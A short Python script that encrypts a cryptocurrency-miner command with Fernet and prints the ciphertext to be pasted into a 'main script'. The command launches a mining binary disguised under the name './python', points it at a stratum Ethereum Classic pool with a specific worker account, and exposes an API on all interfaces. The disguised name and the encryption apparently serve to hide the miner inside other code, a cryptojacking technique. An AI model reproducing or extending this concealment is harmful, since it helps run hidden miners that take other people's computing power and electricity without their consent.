from cryptography.fernet import Fernet


def encrypt_command(command):
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted_command = f.encrypt(str(command).encode()).decode()
    return key, encrypted_command


# The command to be encrypted
command = [
    "./python",  # Assuming the executable is in the current directory
    "-a",
    "etchash",
    "-s",
    "stratum+tcp://etc.poolbinance.com:443",
    "-u",
    "regenx2004.001",
    "-p",
    "123456",
    "--api",
    "0.0.0.0:4067",
]

key, encrypted_command = encrypt_command(command)

print("Encryption Key (save this securely):")
print(key.decode())
print("\nEncrypted Command (paste this in the main script):")
print(encrypted_command)
